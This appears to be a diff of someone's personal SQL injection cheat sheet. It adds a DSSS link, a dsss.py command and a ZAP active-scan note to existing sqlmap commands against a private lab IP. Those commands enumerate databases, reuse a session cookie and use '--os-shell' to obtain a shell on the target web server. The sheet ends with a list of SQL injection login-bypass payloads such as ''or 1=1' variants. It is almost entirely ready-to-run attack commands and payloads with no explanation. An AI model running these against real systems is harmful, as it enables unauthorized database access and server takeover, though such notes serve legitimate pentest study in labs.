@@ -1,6 +1,8 @@
 https://github.com/sqlmapproject/sqlmap/wiki/Usage
 https://hackertarget.com/sqlmap-post-request-injection/
 https://secnhack.in/take-meterpreter-of-website-using-sqlmap-os-shell/
+https://github.com/stamparm/DSSS
+
 
 1
     sqlmap -u "http://192.168.80.162/_PATH_/?cat=1" --dbms=MySQL --dbs
@@ -28,7 +30,7 @@ sqlmap --cookie="security=low; PHPSESSID=oikbs8qcic2omf5gnd09kihsm7" -u "http://
 
 sqlmap -r secnhack --os-shell
 
-
+dsss.py -u "<URL>?<id>" --cookie "<COOKIE>
 
 admin' --
 admin' #
@@ -38,3 +40,6 @@ admin'/*
 ' or 1=1/*
 ') or '1'='1--
 ') or ('1'='1—
+
+
+ZAP > ActiveScan
